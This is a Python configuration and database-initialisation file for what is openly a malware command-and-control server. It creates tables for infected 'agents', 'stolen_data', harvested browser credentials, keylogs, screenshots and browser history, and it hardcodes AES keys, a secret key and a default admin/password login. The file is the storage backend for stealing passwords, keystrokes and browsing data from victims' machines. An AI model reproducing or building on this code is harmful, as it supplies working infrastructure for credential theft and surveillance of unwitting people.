import os
import sqlite3, secrets


class Config:
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 443
        self.database = "c2.db"
        self.aes_key = b"32bytekey-ultra-tecure-123456789"
        self.aes_iv = b"16byteiv-9876543"
        self.upload_folder = "uploads"
        self.screenshot_folder = "screenshots"
        self.max_content_length = 500 * 1024 * 1024  # 500MB
        self.secret_key = "mQsjJsMfsW43sdzPf9L2Sr78"
        self.version = "1.5"
        self.monitor_token = secrets.token_urlsafe(32)  

        
       
        # Create required directories
        os.makedirs(self.upload_folder, exist_ok=True)

        #os.makedirs(self.screenshot_folder, exist_ok=True)

        # Initialize database
        self.init_db()

    def init_db(self):
        conn = sqlite3.connect(self.database)
        c = conn.cursor()
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                hostname TEXT,
                ip TEXT,
                os TEXT,
                last_seen TEXT,
                status TEXT,
                privilege TEXT,
                ws_connected INTEGER DEFAULT 0,
                killdate TEXT DEFAULT NULL,
                checkin_interval INTEGER DEFAULT 10
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS stolen_data (
                id INTEGER PRIMARY KEY,
                agent_id TEXT,
                browser TEXT,
                data_type TEXT,
                content BLOB,
                system_info TEXT,
                timestamp TEXT
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY,
                agent_id TEXT,
                task_type TEXT,
                task_data TEXT,
                status TEXT,
                created_at TEXT,
                completed_at TEXT
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY,
                agent_id TEXT,
                browser TEXT,
                url TEXT,
                username TEXT,
                password TEXT,
                timestamp TEXT
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY,
                agent_id TEXT,
                image BLOB,
                timestamp TEXT
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT UNIQUE,
                password TEXT,
                email TEXT
            )
        ''')

        c.execute('''
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                keys TEXT NOT NULL,
                timestamp TEXT NOT NULL
            )
        ''')

        c.execute('''
            CREATE TABLE IF NOT EXISTS agent_configurations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                checkin_interval INTEGER NOT NULL,
                server_url TEXT NOT NULL,
                take_screenshots INTEGER NOT NULL,
                screenshot_frequency INTEGER NOT NULL,
                killdate_enabled INTEGER NOT NULL,
                killdate TEXT,
                trusted_certificate INTEGER NOT NULL,
                aes_key TEXT NOT NULL,
                aes_iv TEXT NOT NULL,
                timestamp TEXT NOT NULL
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS browser_history (
                id INTEGER PRIMARY KEY,
                agent_id TEXT,
                browser TEXT,
                profile TEXT,
                url TEXT,
                title TEXT,
                visit_count INTEGER,
                last_visit_time INTEGER,
                timestamp TEXT
            )
        ''')

        c.execute('''
            CREATE TABLE IF NOT EXISTS ip_whitelist (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_range TEXT NOT NULL UNIQUE,
                description TEXT,
                enabled INTEGER NOT NULL DEFAULT 1
            )
        ''')

        # Add enabled column if it doesn't exist (for existing databases)
        try:
            c.execute("ALTER TABLE ip_whitelist ADD COLUMN enabled INTEGER NOT NULL DEFAULT 1")
        except sqlite3.OperationalError:
            # Column already exists, ignore error
            pass

        c.execute('''
            CREATE TABLE IF NOT EXISTS blocked_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                first_seen TEXT NOT NULL,
                last_seen TEXT NOT NULL,
                ip TEXT NOT NULL UNIQUE,
                count INTEGER NOT NULL DEFAULT 1
            )
        ''')

        c.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key TEXT NOT NULL UNIQUE,
                value TEXT
            )
        ''')

        # Migrate blocked_logs table if it exists with old schema
        try:
            # Check if old columns exist
            c.execute("SELECT timestamp, ip, path FROM blocked_logs LIMIT 1")
            old_rows = c.fetchall()
            if old_rows:
                # Create new table with correct schema
                c.execute('''
                    CREATE TABLE blocked_logs_new (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        first_seen TEXT NOT NULL,
                        last_seen TEXT NOT NULL,
                        ip TEXT NOT NULL UNIQUE,
                        count INTEGER NOT NULL DEFAULT 1
                    )
                ''')
                # Migrate data
                for row in old_rows:
                    timestamp, ip, path = row
                    c.execute("INSERT OR IGNORE INTO blocked_logs_new (first_seen, last_seen, ip, count) VALUES (?, ?, ?, 1)",
                             (timestamp, timestamp, ip))
                # Replace table
                c.execute("DROP TABLE blocked_logs")
                c.execute("ALTER TABLE blocked_logs_new RENAME TO blocked_logs")
        except sqlite3.OperationalError:
            # Table doesn't exist or already migrated
            pass

        # Remove duplicates first (keep the one with smallest id)
        c.execute('''
            DELETE FROM ip_whitelist
            WHERE id NOT IN (
                SELECT MIN(id)
                FROM ip_whitelist
                GROUP BY ip_range
            )
        ''')

        # Always ensure default allow all is present
        c.execute("INSERT OR IGNORE INTO ip_whitelist (ip_range, description, enabled) VALUES (?, ?, ?)", ("0.0.0.0/0", "Default allow all IPv4 - remove after setup", 1))
        c.execute("INSERT OR IGNORE INTO ip_whitelist (ip_range, description, enabled) VALUES (?, ?, ?)", ("::/0", "Default allow all IPv6 - remove after setup", 1))

        # Add default admin if not exists
        from werkzeug.security import generate_password_hash
        c.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?)", 
                 (1, "admin", generate_password_hash("password"),"admin@home.no"))
        
        conn.commit()
        conn.close()

CONFIG = Config()
